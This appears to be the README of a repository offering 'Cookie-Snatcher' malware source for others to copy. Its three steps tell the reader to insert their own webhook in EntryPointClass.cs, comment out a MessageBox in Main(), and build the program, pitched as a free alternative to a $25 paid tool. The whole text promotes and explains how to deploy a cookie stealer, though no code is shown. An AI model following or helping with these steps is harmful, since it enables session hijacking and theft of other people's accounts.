# Cookie-Snatcher

Hi, so yeah here's the cookie snatcher source code for anyone who wants to c&p.

First: Go to \ANpGZ\EntryPointClass.cs and do CTRL + F "WEBHOOK HERE" then replace the webhook with your own webhook
Second: You might want to remove MessageBox() in the Main() function. Just comment it out. Then build the code on visual studio, or any other compiler.
Third: You're done. You just saved your $25 from being eaten by these inexperienced 'developers'
